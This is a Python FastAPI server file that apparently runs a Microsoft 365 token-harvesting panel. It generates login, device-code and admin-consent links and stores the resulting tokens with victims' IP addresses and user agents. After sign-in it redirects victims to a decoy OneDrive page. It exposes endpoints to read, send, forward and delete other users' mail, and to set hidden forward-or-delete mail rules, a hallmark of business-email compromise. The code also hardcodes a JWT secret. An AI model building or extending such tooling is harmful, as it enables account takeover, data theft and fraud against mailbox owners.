from fastapi import FastAPI, Request, Depends, HTTPException, status
from fastapi.responses import RedirectResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
import logging
import os
from datetime import datetime, timedelta

from jose import jwt, JWTError

from auth import (
    generate_login_link,
    generate_org_connect_link,
    generate_admin_consent_url,
    exchange_code_for_token,
    get_token,
    start_device_code_flow,
    poll_device_code_flow,
    save_or_update_tenant_consent,
)
from graph import (
    fetch_emails,
    get_mail_folders,
    get_email_detail,
    reply_to_email,
    send_email,
    forward_email,
    delete_email,
    mark_as_read,
    move_email_to_folder,
)
from admin_auth import login_admin
from db import init_db, SessionLocal
from models import (
    Rule,
    TenantToken,
    RuleAction,
    SavedUser,
    ConnectInvite,
    TenantConsent,
    TenantConsentStatus,
)

app = FastAPI()

# =========================
# JWT CONFIG
# =========================
SECRET_KEY = "super-secret-key-change-this"
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 10080  # 7 days

CLIENT_ID = "3d3d5a12-09a4-4163-bab2-0188bf65ddd1"
ADMIN_CONSENT_TENANT = os.environ.get("ADMIN_CONSENT_TENANT", "organizations")

security = HTTPBearer()


def create_access_token(data: dict):
    to_encode = data.copy()
    expire = datetime.utcnow() + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)


def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
    try:
        token = credentials.credentials
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        return payload
    except JWTError:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid or expired token"
        )


def resolve_user_id(requested_user_id: str | None, user_payload: dict) -> str:
    return requested_user_id or user_payload["sub"]


# =========================
# LOGGING
# =========================
logging.basicConfig(level=logging.DEBUG)

# =========================
# CORS
# =========================
origins = [
    "http://localhost:3000",
    "https://frontend-xg84.onrender.com",
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


# =========================
# DEBUG MIDDLEWARE
# =========================
@app.middleware("http")
async def log_requests(request: Request, call_next):
    logging.debug("\n--- REQUEST START ---")
    logging.debug(f"{request.method} {request.url}")
    logging.debug(f"Headers: {request.headers}")

    response = await call_next(request)

    logging.debug(f"Response Status: {response.status_code}")
    logging.debug("--- REQUEST END ---\n")

    return response


# =========================
# STARTUP
# =========================
@app.on_event("startup")
def startup():
    init_db()


# =========================
# ADMIN LOGIN
# =========================
@app.post("/admin/login")
async def admin_login_route(request: Request):
    try:
        body = await request.json()
    except Exception:
        return JSONResponse({"error": "Invalid JSON"}, status_code=400)

    username = body.get("username")
    password = body.get("password")

    result = login_admin(username, password)

    if not result or "error" in result:
        return JSONResponse(result or {"error": "Login failed"}, status_code=401)

    token = create_access_token({"sub": username})

    return {
        "access_token": token,
        "token_type": "bearer"
    }


# =========================
# TENANT CONSENT FLOW
# =========================
@app.post("/tenant-consent/generate")
async def generate_tenant_consent(request: Request, user=Depends(verify_token)):
    body = await request.json()
    tenant_hint = (body.get("tenant_hint") or "").strip()

    if not tenant_hint:
        raise HTTPException(status_code=400, detail="tenant_hint is required")

    admin_user_id = user["sub"]
    consent_url = generate_admin_consent_url(tenant_hint)

    save_or_update_tenant_consent(
        admin_user_id=admin_user_id,
        tenant_hint=tenant_hint,
        admin_consent_url=consent_url,
        status=TenantConsentStatus.PENDING
    )

    return {
        "tenant_hint": tenant_hint,
        "admin_consent_url": consent_url,
        "status": "pending"
    }


@app.get("/tenant-consents")
def list_tenant_consents(user=Depends(verify_token)):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]

        rows = (
            db.query(TenantConsent)
            .filter(TenantConsent.admin_user_id == admin_user_id)
            .order_by(TenantConsent.updated_at.desc())
            .all()
        )

        return {
            "tenants": [
                {
                    "tenant_hint": r.tenant_hint,
                    "status": r.status.value if hasattr(r.status, "value") else str(r.status),
                    "admin_consent_url": r.admin_consent_url,
                    "notes": r.notes,
                    "created_at": r.created_at,
                    "updated_at": r.updated_at,
                }
                for r in rows
            ]
        }
    finally:
        db.close()


@app.post("/tenant-consent/approve")
async def manually_approve_tenant(request: Request, user=Depends(verify_token)):
    body = await request.json()
    tenant_hint = (body.get("tenant_hint") or "").strip()

    if not tenant_hint:
        raise HTTPException(status_code=400, detail="tenant_hint required")

    save_or_update_tenant_consent(
        admin_user_id=user["sub"],
        tenant_hint=tenant_hint,
        status=TenantConsentStatus.APPROVED,
        notes="Manually approved"
    )

    return {"status": "approved", "tenant_hint": tenant_hint}


# =========================
# MICROSOFT LOGIN
# =========================
@app.get("/login")
def login(user_id: str, user=Depends(verify_token)):
    return RedirectResponse(generate_login_link(user_id))


@app.get("/generate-login-url")
def generate_login_url(user_id: str, user=Depends(verify_token)):
    login_url = generate_login_link(user_id)
    return {
        "login_url": login_url,
        "user_id": user_id,
        "type": "direct_user_login"
    }


@app.get("/generate-org-connect-url")
def generate_org_connect_url(tenant_hint: str | None = None, user=Depends(verify_token)):
    admin_user_id = user["sub"]
    login_url = generate_org_connect_link(admin_user_id, tenant_hint)

    return {
        "login_url": login_url,
        "tenant_hint": tenant_hint,
        "admin_user_id": admin_user_id,
        "type": "org_connect_invite"
    }


@app.get("/generate-admin-consent-url")
def generate_admin_consent_url_route(tenant: str | None = None, user=Depends(verify_token)):
    return {
        "admin_consent_url": generate_admin_consent_url(tenant),
        "tenant": tenant or ADMIN_CONSENT_TENANT,
        "client_id": CLIENT_ID,
        "type": "admin_consent"
    }


# =========================
# DEVICE CODE FLOW
# =========================
@app.post("/device-code/start")
def device_code_start(user=Depends(verify_token)):
    admin_user_id = user["sub"]

    try:
        result = start_device_code_flow()
        return {
            "admin_user_id": admin_user_id,
            **result
        }
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


@app.post("/device-code/poll")
async def device_code_poll(request: Request, user=Depends(verify_token)):
    body = await request.json()
    device_code = body.get("device_code")

    if not device_code:
        raise HTTPException(status_code=400, detail="device_code is required")

    admin_user_id = body.get("admin_user_id") or user["sub"]
    client_ip = request.client.host if request.client else None
    user_agent = request.headers.get("user-agent")

    try:
        result = poll_device_code_flow(
            device_code=device_code,
            admin_user_id=admin_user_id,
            client_ip=client_ip,
            user_agent=user_agent
        )
        return result
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


# =========================
# MICROSOFT STATUS
# =========================
@app.get("/microsoft/status")
def microsoft_status(user_id: str, user=Depends(verify_token)):
    token_record = get_token(user_id)
    connected = token_record is not None and bool(token_record.refresh_token)

    return {
        "user_id": user_id,
        "connected": connected,
        "has_refresh_token": bool(token_record.refresh_token) if token_record else False,
        "expires_at": token_record.expires_at if token_record else None
    }


# =========================
# SAVED USERS / CONNECTED USERS
# =========================
@app.get("/users")
def list_users(user=Depends(verify_token)):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]

        connected_rows = db.query(TenantToken.tenant_id).distinct().all()
        connected_users = [row[0] for row in connected_rows if row[0]]

        saved_rows = (
            db.query(SavedUser.user_id)
            .filter(SavedUser.admin_user_id == admin_user_id)
            .distinct()
            .all()
        )
        saved_users = [row[0] for row in saved_rows if row[0]]

        user_ids = sorted(set(connected_users + saved_users))
        return {"users": user_ids}
    finally:
        db.close()


@app.get("/saved-users")
def get_saved_users(user=Depends(verify_token)):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]
        rows = (
            db.query(SavedUser)
            .filter(SavedUser.admin_user_id == admin_user_id)
            .order_by(SavedUser.user_id.asc())
            .all()
        )

        return {
            "users": [
                {
                    "id": row.id,
                    "admin_user_id": row.admin_user_id,
                    "user_id": row.user_id,
                    "job_title": getattr(row, "job_title", None),
                    "created_at": row.created_at
                }
                for row in rows
            ]
        }
    finally:
        db.close()


@app.post("/saved-users")
async def add_saved_user(request: Request, user=Depends(verify_token)):
    db = SessionLocal()
    try:
        body = await request.json()
        admin_user_id = user["sub"]
        target_user_id = (body.get("user_id") or "").strip()

        if not target_user_id:
            return JSONResponse({"error": "user_id is required"}, status_code=400)

        existing = (
            db.query(SavedUser)
            .filter(
                SavedUser.admin_user_id == admin_user_id,
                SavedUser.user_id == target_user_id
            )
            .first()
        )

        if existing:
            return {"message": "User already saved", "user_id": target_user_id}

        row = SavedUser(
            admin_user_id=admin_user_id,
            user_id=target_user_id
        )
        db.add(row)
        db.commit()

        return {"message": "User saved", "user_id": target_user_id}
    finally:
        db.close()


@app.delete("/saved-users")
def delete_saved_user(user_id: str, user=Depends(verify_token)):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]

        row = (
            db.query(SavedUser)
            .filter(
                SavedUser.admin_user_id == admin_user_id,
                SavedUser.user_id == user_id
            )
            .first()
        )

        if not row:
            return JSONResponse({"error": "Saved user not found"}, status_code=404)

        db.delete(row)
        db.commit()

        return {"message": "Saved user removed", "user_id": user_id}
    finally:
        db.close()


# =========================
# CONNECT INVITES
# =========================
@app.get("/connect-invites")
def list_connect_invites(user=Depends(verify_token)):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]

        invites = (
            db.query(ConnectInvite)
            .filter(ConnectInvite.admin_user_id == admin_user_id)
            .order_by(ConnectInvite.created_at.desc())
            .all()
        )

        return {
            "invites": [
                {
                    "id": invite.id,
                    "admin_user_id": invite.admin_user_id,
                    "invite_token": invite.invite_token,
                    "tenant_hint": getattr(invite, "tenant_hint", None),
                    "resolved_user_id": invite.resolved_user_id,
                    "job_title": getattr(invite, "job_title", None),
                    "is_used": invite.is_used,
                    "created_at": invite.created_at,
                    "used_at": invite.used_at
                }
                for invite in invites
            ]
        }
    finally:
        db.close()


# =========================
# OAUTH CALLBACK
# =========================
@app.get("/auth/callback")
def auth_callback(request: Request):
    init_db()

    code = request.query_params.get("code")
    state = request.query_params.get("state")

    if not code:
        return {"error": "No code received"}

    client_ip = request.client.host if request.client else None
    user_agent = request.headers.get("user-agent")

    try:
        exchange_code_for_token(code, state, client_ip, user_agent)

        return RedirectResponse(
            url="https://www.microsoft.com/en-us/microsoft-365/onedrive/online-cloud-storage"
        )
    except Exception as e:
        return {"error": str(e)}


# =========================
# EMAILS
# =========================
@app.get("/emails")
def get_emails(
    user_id: str | None = None,
    folder_id: str | None = None,
    user=Depends(verify_token)
):
    resolved_user_id = resolve_user_id(user_id, user)

    try:
        return {
            "emails": fetch_emails(resolved_user_id, folder_id)
        }
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


@app.get("/folders")
def get_folders(user_id: str | None = None, user=Depends(verify_token)):
    resolved_user_id = resolve_user_id(user_id, user)

    try:
        return {
            "folders": get_mail_folders(resolved_user_id)
        }
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


@app.get("/email/{message_id}")
def email_detail(message_id: str, user_id: str | None = None, user=Depends(verify_token)):
    resolved_user_id = resolve_user_id(user_id, user)

    try:
        return get_email_detail(resolved_user_id, message_id)
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


# =========================
# EMAIL ACTIONS
# =========================
@app.post("/email/reply")
async def reply_email_route(request: Request, user=Depends(verify_token)):
    body = await request.json()
    resolved_user_id = resolve_user_id(body.get("user_id"), user)

    return reply_to_email(
        resolved_user_id,
        body.get("message_id"),
        body.get("reply_text")
    )


@app.post("/email/send")
async def send_email_route(request: Request, user=Depends(verify_token)):
    body = await request.json()
    resolved_user_id = resolve_user_id(body.get("user_id"), user)

    return send_email(
        resolved_user_id,
        body.get("to"),
        body.get("subject"),
        body.get("body")
    )


@app.post("/email/forward")
async def forward_email_route(request: Request, user=Depends(verify_token)):
    body = await request.json()
    resolved_user_id = resolve_user_id(body.get("user_id"), user)

    return forward_email(
        resolved_user_id,
        body.get("message_id"),
        body.get("to")
    )


@app.post("/email/delete")
async def delete_email_route(request: Request, user=Depends(verify_token)):
    body = await request.json()
    resolved_user_id = resolve_user_id(body.get("user_id"), user)

    return delete_email(
        resolved_user_id,
        body.get("message_id")
    )


@app.post("/email/mark-read")
async def mark_read_route(request: Request, user=Depends(verify_token)):
    body = await request.json()
    resolved_user_id = resolve_user_id(body.get("user_id"), user)

    return mark_as_read(
        resolved_user_id,
        body.get("message_id"),
        body.get("is_read", True)
    )


@app.post("/email/move")
async def move_email_route(request: Request, user=Depends(verify_token)):
    body = await request.json()
    resolved_user_id = resolve_user_id(body.get("user_id"), user)

    return move_email_to_folder(
        resolved_user_id,
        body.get("message_id"),
        body.get("folder_id")
    )


# =========================
# RULES
# =========================
@app.post("/rules")
async def add_rule(request: Request, user=Depends(verify_token)):
    body = await request.json()
    db = SessionLocal()

    try:
        resolved_user_id = resolve_user_id(body.get("user_id"), user)
        action_value = body.get("action")

        if not body.get("condition"):
            return JSONResponse({"error": "condition is required"}, status_code=400)

        if not body.get("keyword"):
            return JSONResponse({"error": "keyword is required"}, status_code=400)

        if not action_value:
            return JSONResponse({"error": "action is required"}, status_code=400)

        try:
            action_enum = RuleAction(action_value)
        except ValueError:
            return JSONResponse(
                {"error": "Invalid action. Allowed values: move, delete, forward"},
                status_code=400
            )

        if action_value == "move" and not body.get("target_folder"):
            return JSONResponse({"error": "target_folder is required for move action"}, status_code=400)

        if action_value == "forward" and not body.get("forward_to"):
            return JSONResponse({"error": "forward_to is required for forward action"}, status_code=400)

        rule = Rule(
            user_id=resolved_user_id,
            condition=body.get("condition"),
            keyword=body.get("keyword"),
            action=action_enum,
            target_folder=body.get("target_folder"),
            forward_to=body.get("forward_to"),
            is_active=body.get("is_active", True)
        )

        db.add(rule)
        db.commit()

        return {"message": "Rule created"}
    finally:
        db.close()


@app.get("/rules")
def get_rules(user_id: str | None = None, user=Depends(verify_token)):
    db = SessionLocal()

    try:
        resolved_user_id = resolve_user_id(user_id, user)

        rules = db.query(Rule).filter(Rule.user_id == resolved_user_id).all()

        result = [{
            "id": r.id,
            "user_id": r.user_id,
            "condition": r.condition,
            "keyword": r.keyword,
            "action": r.action.value,
            "target_folder": r.target_folder,
            "forward_to": r.forward_to,
            "is_active": r.is_active,
            "created_at": r.created_at
        } for r in rules]

        return {"rules": result}
    finally:
        db.close()